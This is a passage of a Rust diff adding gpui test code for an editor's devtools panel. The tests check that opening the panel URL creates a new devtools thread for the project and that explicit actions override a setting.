+        .expect("R4.1/R4.5: the panel URL was opened");
+    let thread = opened
+        .strip_prefix(&format!("{PANEL}#thread="))
+        .unwrap_or_else(|| panic!("the panel URL with the thread fragment: {opened}"));
+    assert_ne!(thread, editor, "a NEW thread, never the editor's");
+    assert!(
+        cx.update(|cx| crate::devtools_threads::is_devtools_of(thread, Path::new("/p/app"), cx)),
+        "R4.1: the fragment names a devtools thread of this project"
+    );
+}
+
+#[gpui::test]
+async fn hostile_the_explicit_actions_win_over_the_setting(cx: &mut TestAppContext) {
